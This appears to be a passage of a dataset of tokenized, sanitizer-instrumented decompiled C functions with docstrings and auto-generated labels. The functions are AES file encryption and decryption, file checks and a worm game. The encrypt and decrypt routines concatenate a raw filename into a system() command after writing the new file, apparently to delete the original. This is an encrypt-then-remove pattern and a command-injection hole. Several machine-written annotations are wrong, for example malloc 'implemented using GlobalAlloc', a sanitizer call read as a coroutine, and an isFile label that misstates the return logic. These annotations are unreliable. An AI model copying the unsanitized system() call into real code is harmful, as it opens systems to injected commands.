            ")",
            "{",
            "__asan_report_store_n",
            "(",
            "v2",
            "+",
            "96",
            ",",
            "2000L",
            "L",
            ")",
            ";",
            "}",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "96",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "104",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "memset",
            "(",
            "(",
            "void",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "112",
            ")",
            ",",
            "0",
            ",",
            "0x7C0uL",
            "L",
            ")",
            ";",
            "if",
            "(",
            "!",
            "in",
            ")",
            "__ubsan_handle_nonnull_arg",
            "(",
            "&",
            "off_207E00",
            ")",
            ";",
            "strcpy",
            "(",
            "(",
            "char",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "96",
            ")",
            ",",
            "in",
            ")",
            ";",
            "v12",
            "=",
            "(",
            "char",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "96",
            "+",
            "strlen",
            "(",
            "(",
            "const",
            "char",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "96",
            ")",
            ")",
            ")",
            ";",
            "if",
            "(",
            "!",
            "v12",
            ")",
            "__ubsan_handle_nonnull_arg",
            "(",
            "&",
            "off_207E60",
            ")",
            ";",
            "memcpy",
            "(",
            "v12",
            ",",
            "\".crypt\"",
            ",",
            "7uL",
            "L",
            ")",
            ";",
            "In",
            "=",
            "fopen",
            "(",
            "in",
            ",",
            "\"rb\"",
            ")",
            ";",
            "Out",
            "=",
            "fopen",
            "(",
            "(",
            "const",
            "char",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "96",
            ")",
            ",",
            "\"wb\"",
            ")",
            ";",
            "memcpy",
            "(",
            "(",
            "void",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "2144",
            ")",
            ",",
            "&",
            "off_4DE0",
            ",",
            "4uL",
            "L",
            ")",
            ";",
            "if",
            "(",
            "!",
            "in",
            ")",
            "__ubsan_handle_nonnull_arg",
            "(",
            "&",
            "off_207EC0",
            ")",
            ";",
            "v13",
            "=",
            "in",
            ";",
            "strcat",
            "(",
            "(",
            "char",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "2144",
            ")",
            ",",
            "in",
            ")",
            ";",
            "if",
            "(",
            "!",
            "p",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "p",
            "&",
            "7",
            ")",
            "!",
            "=",
            "0",
            ")",
            "{",
            "v13",
            "=",
            "(",
            "char",
            "*",
            ")",
            "p",
            ";",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_207800",
            ",",
            "p",
            ")",
            ";",
            "}",
            "v15",
            "=",
            "*",
            "(",
            "unsigned",
            "__int8",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "p",
            "-",
            ">",
            "plaintext",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "(",
            "_BYTE",
            ")",
            "v15",
            ")",
            "__asan_report_store8",
            "(",
            "&",
            "p",
            "-",
            ">",
            "plaintext",
            ",",
            "v13",
            ",",
            "v15",
            ",",
            "v14",
            ")",
            ";",
            "p",
            "-",
            ">",
            "plaintext",
            "=",
            "In",
            ";",
            "if",
            "(",
            "!",
            "p",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "p",
            "&",
            "7",
            ")",
            "!",
            "=",
            "0",
            ")",
            "{",
            "v13",
            "=",
            "(",
            "char",
            "*",
            ")",
            "p",
            ";",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_207860",
            ",",
            "p",
            ")",
            ";",
            "}",
            "v16",
            "=",
            "*",
            "(",
            "unsigned",
            "__int8",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "p",
            "-",
            ">",
            "out",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "(",
            "_BYTE",
            ")",
            "v16",
            ")",
            "__asan_report_store8",
            "(",
            "&",
            "p",
            "-",
            ">",
            "out",
            ",",
            "v13",
            ",",
            "v16",
            ",",
            "v14",
            ")",
            ";",
            "p",
            "-",
            ">",
            "out",
            "=",
            "Out",
            ";",
            "if",
            "(",
            "!",
            "p",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "p",
            "&",
            "7",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_2078C0",
            ",",
            "p",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "p",
            "-",
            ">",
            "encrypt",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "p",
            "-",
            ">",
            "encrypt",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "{",
            "__asan_report_store4",
            "(",
            "&",
            "p",
            "-",
            ">",
            "encrypt",
            ")",
            ";",
            "}",
            "p",
            "-",
            ">",
            "encrypt",
            "=",
            "1",
            ";",
            "cipher",
            "(",
            "p",
            ")",
            ";",
            "fclose",
            "(",
            "In",
            ")",
            ";",
            "system",
            "(",
            "(",
            "const",
            "char",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "2144",
            ")",
            ")",
            ";",
            "fclose",
            "(",
            "Out",
            ")",
            ";",
            "free",
            "(",
            "p",
            ")",
            ";",
            "if",
            "(",
            "v21",
            "=",
            "=",
            "(",
            "char",
            "*",
            ")",
            "v2",
            ")",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v2",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v2",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8200",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "memset",
            "(",
            "(",
            "void",
            "*",
            ")",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "(",
            "v4",
            "+",
            "536862722",
            ")",
            "&",
            "0xFFFFFFFFFFFFFFF8L",
            "L",
            ")",
            ",",
            "0",
            ",",
            "8L",
            "L",
            "*",
            "(",
            "(",
            "(",
            "(",
            "_DWORD",
            ")",
            "v4",
            "+",
            "2147450880",
            "-",
            "(",
            "(",
            "(",
            "_DWORD",
            ")",
            "v4",
            "+",
            "2147450888",
            ")",
            "&",
            "0xFFFFFFF8",
            ")",
            "+",
            "520",
            ")",
            "&",
            "0xFFFFFFF8",
            ")",
            ">",
            ">",
            "3",
            ")",
            ")",
            ";",
            "}",
            "else",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v2",
            "=",
            "1172321806L",
            "L",
            ";",
            "__asan_stack_free_7",
            "(",
            "v2",
            ",",
            "4160L",
            "L",
            ",",
            "v21",
            ")",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `malloc` is used to dynamically allocate memory in C programs, allowing the user to request a block of memory of a specified size from the operating system, typically implemented using the `GlobalAlloc` function, as seen in the provided code snippets."
        ],
        "longer_label": "The provided code snippet is a C function `encryptAES` that encrypts a file using AES-256-CBC encryption, dynamically allocating memory for parameters, initializing encryption settings, reading input from a file, and writing encrypted output to another file, ultimately performing encryption and handling memory operations with some memory safety annotations."
    },
    {
        "id": 187,
        "docstring_tokens": [
            "This",
            "code",
            "decrypts",
            "a",
            "file",
            "using",
            "AES",
            "encryption",
            "with",
            "a",
            "given",
            "key",
            "and",
            "removes",
            "the",
            "original",
            "encrypted",
            "file",
            "after",
            "decryption",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "char",
            "*",
            "in",
            ",",
            "unsigned",
            "__int8",
            "*",
            "key",
            ")",
            "{",
            "unsigned",
            "__int64",
            "v2",
            ";",
            "__int64",
            "v3",
            ";",
            "_DWORD",
            "*",
            "v4",
            ";",
            "Params_0",
            "*",
            "v5",
            ";",
            "__int64",
            "v6",
            ";",
            "__int64",
            "v7",
            ";",
            "__int64",
            "v8",
            ";",
            "unsigned",
            "__int8",
            "*",
            "v9",
            ";",
            "__int64",
            "v10",
            ";",
            "__int64",
            "v11",
            ";",
            "__int64",
            "v12",
            ";",
            "__int64",
            "v13",
            ";",
            "const",
            "char",
            "*",
            "v14",
            ";",
            "char",
            "*",
            "v15",
            ";",
            "char",
            "*",
            "v16",
            ";",
            "__int64",
            "v17",
            ";",
            "__int64",
            "v18",
            ";",
            "__int64",
            "v19",
            ";",
            "unsigned",
            "__int8",
            "*",
            "keya",
            ";",
            "int",
            "len",
            ";",
            "Params_0",
            "*",
            "p",
            ";",
            "FILE",
            "*",
            "In",
            ";",
            "FILE",
            "*",
            "Out",
            ";",
            "char",
            "v25",
            "[",
            "4120",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v26",
            ";",
            "keya",
            "=",
            "key",
            ";",
            "v2",
            "=",
            "(",
            "unsigned",
            "__int64",
            ")",
            "v25",
            ";",
            "if",
            "(",
            "_asan_option_detect_stack_use_after_return",
            ")",
            "{",
            "v3",
            "=",
            "__asan_stack_malloc_6",
            "(",
            "4096L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "v3",
            ")",
            "v2",
            "=",
            "v3",
            ";",
            "}",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v2",
            "=",
            "1102416563L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "8",
            ")",
            "=",
            "\"2 32 2000 3 out 2080 2000 7 message \"",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "16",
            ")",
            "=",
            "decryptAES",
            ";",
            "v4",
            "=",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v2",
            ">",
            ">",
            "3",
            ")",
            ";",
            "v4",
            "[",
            "536862720",
            "]",
            "=",
            "-",
            "235802127",
            ";",
            "v4",
            "[",
            "536862783",
            "]",
            "=",
            "-",
            "219021312",
            ";",
            "v4",
            "[",
            "536862784",
            "]",
            "=",
            "-",
            "218959118",
            ";",
            "v4",
            "[",
            "536862847",
            "]",
            "=",
            "-",
            "219021312",
            ";",
            "v26",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "v5",
            "=",
            "(",
            "Params_0",
            "*",
            ")",
            "malloc",
            "(",
            "0x38uL",
            "L",
            ")",
            ";",
            "p",
            "=",
            "v5",
            ";",
            "if",
            "(",
            "!",
            "v5",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "v5",
            "&",
            "7",
            ")",
            "!",
            "=",
            "0",
            ")",
            "{",
            "key",
            "=",
            "(",
            "unsigned",
            "__int8",
            "*",
            ")",
            "v5",
            ";",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_207920",
            ",",
            "v5",
            ")",
            ";",
            "}",
            "v7",
            "=",
            "*",
            "(",
            "unsigned",
            "__int8",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "p",
            "-",
            ">",
            "key",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "(",
            "_BYTE",
            ")",
            "v7",
            ")",
            "__asan_report_store8",
            "(",
            "&",
            "p",
            "-",
            ">",
            "key",
            ",",
            "key",
            ",",
            "v7",
            ",",
            "v6",
            ")",
            ";",
            "p",
            "-",
            ">",
            "key",
            "=",
            "keya",
            ";",
            "v9",
            "=",
            "(",
            "unsigned",
            "__int8",
            "*",
            ")",
            "malloc",
            "(",
            "0x10uL",
            "L",
            ")",
            ";",
            "if",
            "(",
            "!",
            "p",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "p",
            "&",
            "7",
            ")",
            "!",
            "=",
            "0",
            ")",
            "{",
            "key",
            "=",
            "(",
            "unsigned",
            "__int8",
            "*",
            ")",
            "p",
            ";",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_207980",
            ",",
            "p",
            ")",
            ";",
            "}",
            "v10",
            "=",
            "*",
            "(",
            "unsigned",
            "__int8",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "p",
            "-",
            ">",
            "IV",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "(",
            "_BYTE",
            ")",
            "v10",
            ")",
            "__asan_report_store8",
            "(",
            "&",
            "p",
            "-",
            ">",
            "IV",
            ",",
            "key",
            ",",
            "v10",
            ",",
            "v8",
            ")",
            ";",
            "p",
            "-",
            ">",
            "IV",
            "=",
            "v9",
            ";",
            "v12",
            "=",
            "EVP_aes_256_cbc",
            "(",
            ")",
            ";",
            "if",
            "(",
            "!",
            "p",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "p",
            "&",
            "7",
            ")",
            "!",
            "=",
            "0",
            ")",
            "{",
            "key",
            "=",
            "(",
            "unsigned",
            "__int8",
            "*",
            ")",
            "p",
            ";",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_2079E0",
            ",",
            "p",
            ")",
            ";",
            "}",
            "v13",
            "=",
            "*",
            "(",
            "unsigned",
            "__int8",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "p",
            "-",
            ">",
            "cipher",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "(",
            "_BYTE",
            ")",
            "v13",
            ")",
            "__asan_report_store8",
            "(",
            "&",
            "p",
            "-",
            ">",
            "cipher",
            ",",
            "key",
            ",",
            "v13",
            ",",
            "v11",
            ")",
            ";",
            "p",
            "-",
            ">",
            "cipher",
            "=",
            "(",
            "const",
            "EVP_CIPHER",
            "*",
            ")",
            "v12",
            ";",
            "if",
            "(",
            "*",
            "(",
            "char",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "0",
            "|",
            "|",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "2031",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "v2",
            "-",
            "17",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v2",
            "+",
            "2031",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_store_n",
            "(",
            "v2",
            "+",
            "32",
            ",",
            "2000L",
            "L",
            ")",
            ";",
            "}",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "32",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "40",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "memset",
            "(",
            "(",
            "void",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "48",
            ")",
            ",",
            "0",
            ",",
            "0x7C0uL",
            "L",
            ")",
            ";",
            "if",
            "(",
            "!",
            "in",
            ")",
            "__ubsan_handle_nonnull_arg",
            "(",
            "&",
            "off_207F20",
            ")",
            ";",
            "strcpy",
            "(",
            "(",
            "char",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "32",
            ")",
            ",",
            "in",
            ")",
            ";",
            "len",
            "=",
            "strlen",
            "(",
            "(",
            "const",
            "char",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "32",
            ")",
            ")",
            ";",
            "v14",
            "=",
            "(",
            "const",
            "char",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "32",
            "+",
            "len",
            ")",
            ";",
            "v15",
            "=",
            "(",
            "char",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "32",
            "+",
            "len",
            "-",
            "6L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "!",
            "v15",
            ")",
            "__ubsan_handle_nonnull_arg",
            "(",
            "&",
            "off_207F80",
            ")",
            ";",
            "if",
            "(",
            "!",
            "v14",
            ")",
            "__ubsan_handle_nonnull_arg",
            "(",
            "&",
            "off_207FE0",
            ")",
            ";",
            "strcpy",
            "(",
            "v15",
            ",",
            "v14",
            ")",
            ";",
            "In",
            "=",
            "fopen",
            "(",
            "in",
            ",",
            "\"rb\"",
            ")",
            ";",
            "Out",
            "=",
            "fopen",
            "(",
            "(",
            "const",
            "char",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "32",
            ")",
            ",",
            "\"wb\"",
            ")",
            ";",
            "memcpy",
            "(",
            "(",
            "void",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "2080",
            ")",
            ",",
            "&",
            "off_4DE0",
            ",",
            "4uL",
            "L",
            ")",
            ";",
            "if",
            "(",
            "!",
            "in",
            ")",
            "__ubsan_handle_nonnull_arg",
            "(",
            "&",
            "off_208040",
            ")",
            ";",
            "v16",
            "=",
            "in",
            ";",
            "strcat",
            "(",
            "(",
            "char",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "2080",
            ")",
            ",",
            "in",
            ")",
            ";",
            "if",
            "(",
            "!",
            "p",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "p",
            "&",
            "7",
            ")",
            "!",
            "=",
            "0",
            ")",
            "{",
            "v16",
            "=",
            "(",
            "char",
            "*",
            ")",
            "p",
            ";",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_207A40",
            ",",
            "p",
            ")",
            ";",
            "}",
            "v18",
            "=",
            "*",
            "(",
            "unsigned",
            "__int8",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "p",
            "-",
            ">",
            "plaintext",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "(",
            "_BYTE",
            ")",
            "v18",
            ")",
            "__asan_report_store8",
            "(",
            "&",
            "p",
            "-",
            ">",
            "plaintext",
            ",",
            "v16",
            ",",
            "v18",
            ",",
            "v17",
            ")",
            ";",
            "p",
            "-",
            ">",
            "plaintext",
            "=",
            "In",
            ";",
            "if",
            "(",
            "!",
            "p",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "p",
            "&",
            "7",
            ")",
            "!",
            "=",
            "0",
            ")",
            "{",
            "v16",
            "=",
            "(",
            "char",
            "*",
            ")",
            "p",
            ";",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_207AA0",
            ",",
            "p",
            ")",
            ";",
            "}",
            "v19",
            "=",
            "*",
            "(",
            "unsigned",
            "__int8",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "p",
            "-",
            ">",
            "out",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ";",
            "if",
            "(",
            "(",
            "_BYTE",
            ")",
            "v19",
            ")",
            "__asan_report_store8",
            "(",
            "&",
            "p",
            "-",
            ">",
            "out",
            ",",
            "v16",
            ",",
            "v19",
            ",",
            "v17",
            ")",
            ";",
            "p",
            "-",
            ">",
            "out",
            "=",
            "Out",
            ";",
            "if",
            "(",
            "!",
            "p",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "p",
            "&",
            "7",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_207B00",
            ",",
            "p",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "p",
            "-",
            ">",
            "encrypt",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "p",
            "-",
            ">",
            "encrypt",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "{",
            "__asan_report_store4",
            "(",
            "&",
            "p",
            "-",
            ">",
            "encrypt",
            ")",
            ";",
            "}",
            "p",
            "-",
            ">",
            "encrypt",
            "=",
            "0",
            ";",
            "cipher",
            "(",
            "p",
            ")",
            ";",
            "fclose",
            "(",
            "In",
            ")",
            ";",
            "system",
            "(",
            "(",
            "const",
            "char",
            "*",
            ")",
            "(",
            "v2",
            "+",
            "2080",
            ")",
            ")",
            ";",
            "fclose",
            "(",
            "Out",
            ")",
            ";",
            "if",
            "(",
            "!",
            "p",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "p",
            "&",
            "7",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_207B60",
            ",",
            "p",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "p",
            "-",
            ">",
            "IV",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "__asan_report_load8",
            "(",
            "&",
            "p",
            "-",
            ">",
            "IV",
            ")",
            ";",
            "free",
            "(",
            "p",
            "-",
            ">",
            "IV",
            ")",
            ";",
            "free",
            "(",
            "p",
            ")",
            ";",
            "if",
            "(",
            "v25",
            "=",
            "=",
            "(",
            "char",
            "*",
            ")",
            "v2",
            ")",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v2",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v2",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF81F8",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "memset",
            "(",
            "(",
            "void",
            "*",
            ")",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "(",
            "v4",
            "+",
            "536862722",
            ")",
            "&",
            "0xFFFFFFFFFFFFFFF8L",
            "L",
            ")",
            ",",
            "0",
            ",",
            "8L",
            "L",
            "*",
            "(",
            "(",
            "(",
            "(",
            "_DWORD",
            ")",
            "v4",
            "+",
            "2147450880",
            "-",
            "(",
            "(",
            "(",
            "_DWORD",
            ")",
            "v4",
            "+",
            "2147450888",
            ")",
            "&",
            "0xFFFFFFF8",
            ")",
            "+",
            "512",
            ")",
            "&",
            "0xFFFFFFF8",
            ")",
            ">",
            ">",
            "3",
            ")",
            ")",
            ";",
            "}",
            "else",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v2",
            "=",
            "1172321806L",
            "L",
            ";",
            "__asan_stack_free_6",
            "(",
            "v2",
            ",",
            "4096L",
            "L",
            ",",
            "v25",
            ")",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function named \"stack\" likely represents a data structure or module responsible for managing stacks in various contexts, such as a stack for stack frames in an execution environment, a stack for managing JavaScript function calls, or a stack for implementing operations on binary search trees.",
            "The `malloc` function is typically used for dynamic memory allocation in C programming to allocate memory on the heap, enabling the programmer to request a specific amount of memory during program execution, as shown in the provided code where it allocates memory using the `GlobalAlloc` function and initializes it with zeros."
        ],
        "longer_label": "The provided code appears to be a C function for decrypting AES-encrypted data, utilizing dynamic memory allocation, file I/O operations, and likely interacting with a cryptographic library, with annotations highlighting potential interpretations of specific code segments."
    },
    {
        "id": 188,
        "docstring_tokens": [
            "The",
            "code",
            "checks",
            "if",
            "a",
            "given",
            "name",
            "is",
            "a",
            "file",
            "by",
            "attempting",
            "to",
            "open",
            "it",
            "as",
            "a",
            "directory",
            ",",
            "and",
            "returns",
            "true",
            "if",
            "it",
            "is",
            "not",
            "a",
            "directory",
            "."
        ],
        "code_tokens": [
            "bool",
            "__cdecl",
            "FUN0",
            "(",
            "char",
            "*",
            "name",
            ")",
            "{",
            "int",
            "*",
            "v2",
            ";",
            "unsigned",
            "__int64",
            "v3",
            ";",
            "DIR",
            "*",
            "directory",
            ";",
            "if",
            "(",
            "!",
            "name",
            ")",
            "__ubsan_handle_nonnull_arg",
            "(",
            "&",
            "off_207160",
            ")",
            ";",
            "directory",
            "=",
            "opendir",
            "(",
            "name",
            ")",
            ";",
            "if",
            "(",
            "directory",
            ")",
            "{",
            "closedir",
            "(",
            "directory",
            ")",
            ";",
            "return",
            "0",
            ";",
            "}",
            "else",
            "{",
            "v2",
            "=",
            "__errno_location",
            "(",
            ")",
            ";",
            "v3",
            "=",
            "(",
            "unsigned",
            "__int64",
            ")",
            "v2",
            ";",
            "if",
            "(",
            "!",
            "v2",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "v2",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_2070A0",
            ",",
            "v2",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "v3",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "v3",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "v3",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "__asan_report_load4",
            "(",
            "v3",
            ")",
            ";",
            "return",
            "1",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `san_handle` function appears to be a part of a system for handling various types of errors and violations in a software system, likely related to memory safety and integrity checks, featuring structures for socket I/O handling, mutex, and functions for handling overflow, alignment assumptions, and unrecoverable errors, possibly utilized within a broader sanitization framework.",
            "The \"nonnull\" function returns a non-null string if provided, otherwise, it returns a default string, serving as a safety measure to prevent null pointer issues in C code.",
            "The `closed` function appears to be a coroutine or a similar construct used for managing I/O operations, particularly focused on checking if a stream is closed for reading, and handling contexts and blocking operations within the coroutine's execution.",
            "",
            "The function `asan_report_load4` is likely part of a memory sanitizer tool, providing a mechanism to report memory access violations specifically for loading 4 bytes of memory without aborting the program."
        ],
        "longer_label": "The code is a C function `isFile` that checks if a file exists by attempting to open it using `opendir` and returns 0 if successful (indicating the file exists) or 1 if unsuccessful (indicating the file does not exist), with additional error handling and safety checks using functions like `__ubsan_handle_nonnull_arg`, `__errno_location`, and `__asan_report_load4`."
    },
    {
        "id": 189,
        "docstring_tokens": [
            "The",
            "code",
            "checks",
            "if",
            "a",
            "file",
            "at",
            "the",
            "specified",
            "path",
            "can",
            "be",
            "opened",
            "and",
            "modified",
            ",",
            "returning",
            "true",
            "if",
            "successful",
            "and",
            "false",
            "if",
            "not",
            "."
        ],
        "code_tokens": [
            "bool",
            "__cdecl",
            "FUN0",
            "(",
            "char",
            "*",
            "path",
            ")",
            "{",
            "FILE",
            "*",
            "f",
            ";",
            "f",
            "=",
            "fopen",
            "(",
            "path",
            ",",
            "modes",
            ")",
            ";",
            "if",
            "(",
            "!",
            "f",
            ")",
            "return",
            "0",
            ";",
            "fclose",
            "(",
            "f",
            ")",
            ";",
            "return",
            "1",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": ""
    },
    {
        "id": 190,
        "docstring_tokens": [
            "The",
            "code",
            "updates",
            "the",
            "position",
            "and",
            "length",
            "of",
            "a",
            "worm",
            "on",
            "a",
            "game",
            "board",
            "while",
            "checking",
            "for",
            "collisions",
            "and",
            "changing",
            "the",
            "direction",
            "of",
            "the",
            "worm",
            "'s",
            "movement",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            ")",
            "{",
            "unsigned",
            "int",
            "v0",
            ";",
            "unsigned",
            "int",
            "v1",
            ";",
            "__int64",
            "v2",
            ";",
            "unsigned",
            "int",
            "v3",
            ";",
            "_DWORD",
            "*",
            "v4",
            ";",
            "__int64",
            "i",
            ";",
            "__int64",
            "v6",
            ";",
            "int",
            "v7",
            ";",
            "int",
            "v8",
            ";",
            "int",
            "v9",
            ";",
            "int",
